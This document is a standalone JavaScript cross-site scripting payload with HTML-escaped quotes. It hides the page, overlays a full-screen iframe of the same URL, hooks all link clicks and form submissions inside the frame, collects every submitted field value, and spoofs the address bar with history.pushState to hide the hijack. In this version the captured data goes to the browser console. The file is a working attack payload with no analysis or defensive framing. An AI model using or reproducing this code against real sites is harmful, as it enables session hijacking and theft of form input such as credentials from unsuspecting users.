(function() {
	var d = new Date();
	function log(m){
		var s = d; 								  						
		for(i in m){ s += &#34;\n&#34; + i + &#34;:&#34; + m[i] + &#34; &#34;;	} 			
		console.log(s);
	}

	function spoof(k){
		window.history.pushState({}, &#34;&#34;, k);							
	}
	
	function hook(){
		$(&#39;#xss&#39;).contents().find(&#39;a&#39;).bind(&#39;click&#39;, function() {		
			log({&#34;Event&#34;:&#34;Link&#34;, &#34;Current&#34;:document.URL, &#34;Target&#34;:$(this).attr(&#39;href&#39;)});
			spoof($(this).attr(&#39;href&#39;));
		});
		$(&#39;#xss&#39;).contents().find(&#39;form&#39;).bind(&#39;submit&#39;, function() {	
			var l = {&#34;Event&#34;:&#34;Form&#34;, &#34;Current&#34;:document.URL, &#34;Target&#34;:$(this).attr(&#39;action&#39;)};
			$.each($(this).serializeArray(), function(i, f) { l[f.name] = f.value; });
			log(l);
			spoof($(this).attr(&#39;action&#39;));
		});
	}
	
	function poison() {
		if (self == top){											
			$(&#39;body&#39;).children().hide();						
			log({&#34;Hooked&#34;:document.URL});
			$(&#39;&lt;iframe id=&#34;xss&#34;&gt;&#39;).attr(&#39;src&#39;, document.URL).css({
				&#34;position&#34;:&#34;fixed&#34;, &#34;top&#34;:&#34;0px&#34;, &#34;left&#34;:&#34;0px&#34;, &#34;bottom&#34;:&#34;0px&#34;, &#34;right&#34;:&#34;0px&#34;, &#34;width&#34;:&#34;100%&#34;, &#34;height&#34;:&#34;100%&#34;, &#34;border&#34;:&#34;none&#34;, &#34;margin&#34;:&#34;0&#34;, &#34;padding&#34;:&#34;0&#34;, &#34;overflow&#34;:&#34;hidden&#34;, &#34;z-index&#34;:&#34;999999&#34;
			}).appendTo(&#39;body&#39;).load(function(){ 				
				hook();												
			});
		}
	}
	
	function poll() {
		if (typeof(jQuery) !== &#39;undefined&#39;) {
			clearInterval(interval);
			poison();
		}
	}
    if (typeof(jQuery) == &#39;undefined&#39;) {	
        var s = document.createElement(&#39;script&#39;);
		s.src = (&#39;https:&#39; == document.location.protocol ? &#39;https://&#39; : &#39;http://&#39;) + &#39;code.jquery.com/jquery-latest.min.js&#39;;
        document.head.appendChild(s);
        var interval = setInterval(poll, 50); 
    } else {
        poison();
    }
})();

